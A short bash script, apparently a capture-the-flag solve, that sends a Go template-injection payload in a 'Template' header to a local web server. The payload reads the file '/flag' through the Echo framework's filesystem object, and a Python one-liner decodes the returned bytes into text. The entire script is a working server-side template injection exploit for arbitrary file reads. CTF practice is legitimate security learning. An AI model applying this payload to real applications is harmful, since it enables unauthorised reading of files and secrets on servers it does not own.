#!/bin/bash

curl http://localhost:8000 -H 'Template: {{(.Echo.Filesystem.Open "/flag").Read (.Get "template")}}{{.Get "template"}}' | python -c 's=input();print("".join(map(lambda x:chr(int(x)),s[s.index("[")+1:s.index("]")].split())))'

